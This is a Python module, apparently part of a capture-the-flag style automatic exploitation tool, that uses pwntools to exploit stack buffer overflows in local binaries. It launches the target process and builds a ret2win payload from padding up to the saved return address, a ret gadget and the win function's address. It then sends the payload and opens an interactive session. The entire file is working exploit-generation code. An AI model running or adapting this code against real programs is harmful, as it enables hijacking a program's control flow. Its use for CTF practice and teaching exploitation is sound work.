from dataclasses import dataclass
from goals import Goal, WinFunction
from pwn import p64, process, ROP
from vulns import Vulnerability, StackBufferOverflow
from binary import Binary

@dataclass
class ExploitError(Exception):
    message: str

def exploit(binary: Binary, goal: Goal, vulns: list[Vulnerability]):
    p = process(binary.path)
    payload = gen_payload(binary, goal, vulns)
    input("[ENTER TO CONTINUE]")
    p.sendline(payload)
    p.interactive()

def gen_payload(binary: Binary, goal: Goal, vulns: list[Vulnerability]) -> bytes:
    if not isinstance(goal, WinFunction):
        raise ExploitError("Only WinFunction goals are supported")

    for vuln in vulns:
        if isinstance(vuln, StackBufferOverflow):
            return gen_stack_buffer_overflow_payload(binary, vuln, goal)

    raise ExploitError("Payload generation requires a StackBufferOverflow vulnerability")

def gen_stack_buffer_overflow_payload(
    binary: Binary,
    vuln: StackBufferOverflow,
    goal: WinFunction
) -> bytes:
    rop = ROP(binary.elf)
    gadget = rop.find_gadget("ret")
    payload = b"A" * vuln.saved_rip_offset + p64(gadget.addr) + p64(goal.addr)
    if vuln.max_write_size is not None and len(payload) > vuln.max_write_size:
        raise ExploitError("Payload exceeds vulnerability max write size")
    return payload
